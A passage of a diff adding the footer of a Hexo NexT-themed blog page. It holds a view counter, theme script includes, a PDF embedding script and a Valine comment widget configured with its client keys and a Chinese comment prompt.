+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'nhITwFwMLqOi81E1nOPXx9Iw-MdYXbMMI',
+      appKey     : 'F9l5INUqgwxvbJOfC1X7OMnr',
+      placeholder: "欢迎在这里留言！我看到一定会及时回复的噢 （PS：回复信息会自动发送到你所填写的邮箱噢）",
+      avatar     : '',
+      meta       : guest,
+      pageSize   : '6' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
